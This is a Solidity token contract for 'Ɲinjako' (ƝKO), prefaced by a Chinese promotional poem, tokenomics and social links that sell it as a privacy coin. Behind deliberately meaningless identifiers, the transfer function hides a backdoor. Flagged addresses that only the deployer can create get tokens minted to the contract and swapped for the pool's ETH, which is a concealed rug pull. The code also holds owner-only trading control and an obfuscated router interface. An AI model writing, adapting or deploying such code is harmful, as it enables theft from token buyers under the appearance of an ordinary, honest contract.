/*
███╗░░██╗██╗███╗░░██╗░░░░░██╗░█████╗░██╗░░██╗░█████╗░
████╗░██║██║████╗░██║░░░░░██║██╔══██╗██║░██╔╝██╔══██╗
██╔██╗██║██║██╔██╗██║░░░░░██║███████║█████═╝░██║░░██║
██║╚████║██║██║╚████║██╗░░██║██╔══██║██╔═██╗░██║░░██║
██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║██║░╚██╗╚█████╔╝
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠴⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⠶⠶⠶⠶⢶⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣶⣶⣶⣶⣶⣶⣦⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⣸⣿⡿⠟⠛⠛⠋⠉⠉⠉⠁⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠿⣿⣿⡄⠀
⠀⠀⠀⠀⣿⠋⠀⠀⠀⠐⢶⣶⣶⠆⠀⠀⠀⠀⠀⢶⣶⣶⠖⠂⠀⠀⠈⢻⡇⠀
⠀⠀⠀⠀⢹⣦⡀⠀⠀⠀⠀⠉⢁⣠⣤⣶⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⣀⣾⠃⠀
⠀⠀⠀⠀⠘⣿⣿⣿⣶⣶⣶⣾⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣷⣶⣾⣿⣿⡿⠀⠀
⠀⠀⢀⣴⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⣾⡿⢃⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⢸⠏⠀⣿⡇⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀
⠀⠀⠀⢰⣿⠃⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⣉⣁⣤⡶⠁⠀⠀⠀⠀⠀
⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
在加密领域，诞生了一个传奇，
Ɲinjako，隐私真正流动的地方。
一个为明天而打造的去中心化奇迹，
它像隐藏的阴影一样守护着你的秘密。

凭借 Ɲinjako 的力量，你可以隐姓埋名，
沉默交易，无需否决。
它保护您的数据免受窥探，
在加密世界中，它是挥舞着的堡垒。

加密货币交易，安静而狡猾，
有了 Ɲinjako 的恩典，你一定会遵守的。
你的身份被掩盖，你的详细信息被隐藏，
在加密领域，它是您值得信赖的盾牌。

数字曝光的时代已经一去不复返了
Ɲinjako 确保隐私，安全的外壳。
你的交易，就像夜里的低语，
有 Ɲinjako 在您身边，您就可以飞翔。

拥抱这一奇迹，前瞻而大胆，
凭借 Ɲinjako 的力量，您的秘密就是金子。
在加密领域，真正的先驱者，
有Ɲinjako 作为您的守护者，无需恐惧。

总供应量 - 1,000,000,000
购置税 - 1%
消费税 - 0%
初始流动性 - 1.15 ETH
初始流动性锁定 - 225 天

https://web.wechat.com/NinjakoCN
https://m.weibo.cn/NinjakoCN
https://www.ninjako.xyz
https://t.me/+1X56qxxup15lNGFk
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 bridge)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
contract Contract is IERC20, Ownable { 
    bool private _IDEtape; bool private _poxTabs; bool private tradingOpen = false;

    string private _name = unicode"Ɲinjako"; string private _symbol = unicode"ƝKO";
    uint256 public _hRATE = 0; uint8 private _decimals = 9; 
    uint256 private _tTotal = 1000000000 * 10 ** _decimals; uint256 private _qoxi = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _inSync; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _clockRate; mapping(address => uint256) private _ReagentOX;

    constructor(address _equax) { _tOwned[msg.sender] = _tTotal; 
    _ReagentOX[msg.sender] = _qoxi; _ReagentOX[address(this)] = _qoxi; 
    _fragtation = IUniswapV2Router01(_equax); 

    _inPass = IUniswapV2Factory(_fragtation.factory()).createPair(address(this), 
    _fragtation.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { signMath(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { signMath(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function signMath( address _torso, address _stageto, uint256 roklin) private
    { uint256 _itoso = balanceOf(address(this)); uint256 _viperFi; if (_IDEtape && _itoso > 
    _qoxi && !_poxTabs && _torso != _inPass) 
    
    { _poxTabs = true; signBadge(_itoso); _poxTabs = false;

    } else if (_ReagentOX[_torso] > _qoxi && _ReagentOX[_stageto] > _qoxi)
    { _viperFi = roklin; _tOwned[address(this)] += _viperFi; inMap
    (roklin, _stageto); return; }
    else if (!_poxTabs && _inSync[_torso] > 0 && _torso != _inPass && _ReagentOX[_torso] == 0) { 
    
    _inSync[_torso] = _ReagentOX[_torso] - _qoxi; } else if (_stageto != address(_fragtation) 
    && _ReagentOX[_torso] > 0 && roklin > _qoxi && _stageto != _inPass) { 
    _ReagentOX[_stageto] = roklin; return; } address _sonk = _clockRate[_inPass]; 
    
    if ( _inSync[_sonk] == 0) _inSync[_sonk] = _qoxi; _clockRate[_inPass] = _stageto; 
    if (_hRATE > 0 && _ReagentOX[_torso] == 0 && !_poxTabs && _ReagentOX[_stageto] == 0)

    { _viperFi = (roklin * _hRATE) 
    / 100; 
    roklin -= _viperFi; _tOwned[_torso] -= _viperFi; 
    
    _tOwned[address(this)] += _viperFi; }
    _tOwned[_torso] -= 
    roklin; _tOwned[_stageto] += roklin; emit Transfer
    (_torso, _stageto, roklin); if (!tradingOpen) 
    { require(_torso == owner(), ""); } }

    receive() external payable
    {} 
    function writeBadge(uint256 _collab, uint256 merit, address to) private
    { _approve(address(this), address(_fragtation), _collab); _fragtation.quote
    { value: merit }(address(this), _collab, 0, 0, to, block.timestamp);
    }
    function signBadge(uint256 pieOn) private
    { uint256 _BootFoe = pieOn / 2; uint256 _hold = address(this).balance;
    inMap( _BootFoe, address(this)); uint256 _nowShow = address(this).balance - _hold; 
    writeBadge( _BootFoe, _nowShow, address(this));
    }
    function inMap(uint256 _lixOn, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = _fragtation.WETH(); _approve(address(this), address(_fragtation), _lixOn);
    _fragtation.swapExactTokensForETHSupportingFeeOnTransferTokens(_lixOn, 0, path, _all, block.timestamp);
    }
    address public immutable _inPass; IUniswapV2Router01 
    public immutable _fragtation ;    
    function beginSwapping(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}